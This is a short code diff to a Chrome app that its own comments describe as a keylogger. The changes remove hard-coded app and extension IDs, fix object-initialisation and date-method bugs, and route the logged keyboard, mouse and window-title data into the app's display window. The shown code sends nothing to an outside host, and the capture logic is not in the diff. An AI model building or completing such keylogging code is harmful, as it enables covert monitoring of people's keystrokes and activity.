@@ -1,10 +1,5 @@
 // ******** do not edit below this line *********
 
-var __appID = {
-    app: "opfpjfjicecfggophkmacanbphmfigja",
-    ext: "cciecdfdfbhkbheicoebjblaehbaifgb"
-}
-
 // Create the page that draw actual keylogging informations
 //var documentWin = null;
 chrome.app.runtime.onLaunched.addListener(function() {
@@ -15,7 +10,7 @@ chrome.app.runtime.onLaunched.addListener(function() {
 var Keylogger = function() {
     
     // The object is created with null variables
-    this.time = { epoch: 0, obj: new Date() };
+    this.time = { epoch: 0, obj: new Date(0) };
     this.title = null;
     this.mouse = null;
     this.keyboard = null;
@@ -56,11 +51,11 @@ var Keylogger = function() {
     }
     */
     this.get = function() {
-        var ret = null;
+        var ret = {};
         ret.time = {
             epoch: this.time.epoch,
-            localeTime: this.time.obj.toLocaleTimestring(),
-            localeDate: this.time.obj.toLocaleDatestring()
+            localeTime: this.time.obj.toLocaleTimeString(),
+            localeDate: this.time.obj.toLocaleDateString()
         };
         if (this.mouse) { ret.mouse = this.mouse };
         if (this.keyboard) { ret.keyboard = this.keyboard };
@@ -117,9 +112,7 @@ var Keylogger = function() {
     
     this.updateWindow = function() {
         //(chrome.app.window.get(__config.opt_window.id)).contentWindow.document.getElementById("content").innerHTML = this.logHTML();
-        chrome.runtime.getBackgroundPage(function(page) {
-            page.bar(this.get());
-        });
+        (chrome.app.window.get(__config.opt_window.id)).contentWindow.populate(this.get());
         (chrome.app.window.get(__config.opt_window.id)).contentWindow.document.getElementById("logging").value += this.logXML();
     }
 }
